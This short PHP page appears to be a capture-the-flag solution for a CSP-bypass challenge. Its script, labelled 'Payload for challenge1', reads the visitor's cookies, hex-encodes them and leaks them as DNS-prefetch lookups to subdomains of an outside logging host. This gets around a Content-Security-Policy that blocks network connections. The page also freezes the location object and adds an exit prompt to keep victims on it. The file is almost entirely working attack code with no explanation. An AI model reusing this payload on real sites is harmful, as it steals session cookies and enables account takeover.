<?php

error_reporting(0);
header("Access-Control-Allow-Origin: *");
header("content-security-policy: sandbox allow-scripts allow-same-origin; base-uri 'none';default-src 'self';script-src 'unsafe-inline' 'self';connect-src 'none';object-src 'none';frame-src 'none';font-src data: 'self';style-src 'unsafe-inline' 'self';");

// sandbox allow-scripts allow-same-origin;
// base-uri 'none';
// default-src 'self';
// connect-src 'none';
// object-src 'none';
// frame-src 'none';
// font-src data: 'self';
// script-src 'unsafe-inline' 'self';
// style-src 'unsafe-inline' 'self';

?>
<script>
window.addEventListener("beforeunload", function (event) {
  event.returnValue = "Are you sure want to exit?"
  return "Are you sure want to exit?"
})
Object.freeze(document.location) </script>


<!-- Payload for challenge1 -->
<script>
    function toHex(s){
        var val = "";
        for (var i = 0; i < s.length; i++) {
            val += s.charCodeAt(i).toString(16);
        }
        return val;
    }
    c = document.cookie.split(";");
    var html = "";
    for (var i=0; i<c.length;i++)
    {
        t = toHex(c[i]);
        for(var j = 0; j < 5; j++){
            var tt =t.substr(j*30,30);
            if (tt.length == 0) break;
            html += "<link rel=\"dns-prefetch\" href=\"//v_"+i+"_"+j+"_" + tt+  ".flag.sglpih.ceye.io\">";
        }
    }
    document.head.innerHTML += html
</script>

